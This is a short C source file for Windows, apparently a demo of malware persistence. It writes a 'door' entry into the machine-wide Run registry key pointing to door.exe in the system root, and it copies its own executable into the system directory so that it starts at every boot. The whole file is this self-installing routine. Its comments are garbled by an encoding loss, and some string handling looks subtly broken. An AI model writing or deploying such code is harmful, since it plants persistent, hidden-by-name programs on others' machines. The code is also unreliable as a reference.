#pragma warning(disable:4996)
#include <stdio.h>
#include<Windows.h>

int main()
{
	LPCWSTR regname = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";//ע����������ַ
	HKEY hkResult;//ע����ֵ���
	int ret;
	ret = RegOpenKey(HKEY_LOCAL_MACHINE, regname, &hkResult);	//�򿪹ؼ���
	if (ret == 0)
	{
		printf("success to open key\n");
	}
	else
	{
		printf("failed to open regedit.%d\n", ret);
	}
	ret = RegSetValueEx(hkResult, L"door", 0, REG_EXPAND_SZ, (unsigned char*)"%systemroot%\\door.exe", 25);//���ü�ֵ
	if (ret == 0)
	{
		printf("success to write run key\n");
		RegCloseKey(hkResult);
	}
	else
	{
		printf("failed to open regedit.%d\n", ret);
		return 0;
	}
	LPWSTR modlepath=new wchar_t[256];
	LPWSTR syspath=new wchar_t[256];
	GetModuleFileName(0, modlepath, 256);	//ȡ�ó�������
	GetSystemDirectory(syspath, 256);
	ret = CopyFile(modlepath, wcscat(syspath, L"\\door.exe"), 1);
	if (ret)
	{
		printf("%s has been copyed to sys dir %s\n", modlepath, syspath);
	}
	else
		printf("%s is exisis", modlepath);
	system("pause");//ֻ��Ϊ�˲��Ը��㿴���������ɾȥ��һ��
	return 0;
}